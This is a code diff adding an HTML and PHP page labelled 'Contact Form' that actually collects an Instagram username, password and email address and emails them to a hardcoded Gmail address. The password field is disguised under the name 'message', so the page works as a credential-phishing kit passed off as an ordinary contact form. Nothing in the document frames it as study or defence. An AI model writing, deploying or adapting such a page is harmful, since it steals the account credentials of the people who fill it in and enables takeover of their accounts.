@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Contact Form</title>
+</head>
+<body>
+  <h2>Contact Form</h2>
+  <form action="send_email.php" method="post">
+    <label for="name">Instagram Name:</label><br>
+     <input type="text" id="name" name="name" required><br>
+    <label for="message">Password :</label><br>
+     <input type="password" id="message" name="message" required></input><br>
+   
+    <label for="email">Your Email:</label><br>
+    <input type="email" id="email" name="email" required><br>
+    
+   
+    <input type="submit" value="Send">
+  </form>
+
+  <?php
+  // Check if the form is submitted
+  if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Retrieve form data
+    $name = $_POST["name"];
+    $email = $_POST["email"];
+    $message = $_POST["message"];
+    
+    // Email parameters
+    $to = "hashirzx231@gmail.com"; // Replace with your email
+    $subject = "Message from $name";
+    $body = "From: $name\nEmail: $email\n\n$message";
+    
+    // Send email
+    if (mail($to, $subject, $body)) {
+      echo "Email sent successfully!";
+    } else {
+      echo "Error: Unable to send email.";
+      // Optionally, you can output the specific error message:
+      // echo error_get_last()['message'];
+    }
+  }
+  ?>
+</body>
+</html>
